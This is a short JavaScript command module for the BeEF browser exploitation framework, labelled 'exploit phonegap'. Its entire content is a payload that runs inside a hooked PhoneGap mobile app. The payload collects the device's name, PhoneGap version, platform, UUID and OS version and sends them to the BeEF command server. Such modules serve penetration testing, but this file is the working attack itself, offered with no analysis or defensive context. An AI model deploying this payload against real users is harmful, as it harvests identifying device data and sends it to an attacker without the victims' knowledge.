// 
// exploit phonegap
//
beef.execute(function() {

    beef.net.send("<%= @command_url %>", <%= @command_id %>, 
   'phonegap_version='+" name: " + device.name 
    + " phonegap api: " + device.phonegap
    + " platform: " + device.platform
    + " uuid: " + device.uuid
    + " version: " + device.version);	
});
